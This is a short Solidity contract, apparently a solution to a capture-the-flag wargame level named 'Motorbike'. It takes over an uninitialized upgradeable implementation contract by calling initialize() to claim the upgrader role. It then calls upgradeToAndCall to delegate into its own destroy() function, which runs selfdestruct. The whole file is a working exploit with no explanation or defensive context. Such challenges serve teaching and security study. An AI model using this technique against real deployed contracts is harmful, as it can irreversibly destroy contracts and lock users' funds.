// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address _newImplementation, bytes calldata _data) external;
}

contract Motorbike {
    IEngine implementation;

    constructor(address _implementationAddress) {
        implementation = IEngine(_implementationAddress);
    }

    function attack() public {
        // prepare data for delegate call
        bytes memory data = abi.encodeWithSignature("destroy()");

        // re-initialize implementation claiming upgrader role
        implementation.initialize();

        // call upgradeToAndCall directly on implementation
        implementation.upgradeToAndCall(address(this), data);
    }

    function destroy() public {
        selfdestruct(payable(address(0)));
    }
}
